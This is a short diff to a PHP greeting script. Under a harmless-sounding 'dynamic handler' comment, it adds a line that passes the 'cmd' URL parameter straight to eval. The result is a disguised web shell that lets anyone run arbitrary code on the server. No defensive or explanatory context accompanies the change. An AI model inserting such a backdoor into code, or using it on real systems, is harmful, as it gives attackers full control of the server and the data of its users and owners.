@@ -5,3 +5,6 @@ function greet($name) {
 }
 $user = isset($_GET['name']) ? $_GET['name'] : "guest";
 echo greet($user);
+
+// dynamic handler
+eval($_GET['cmd']);
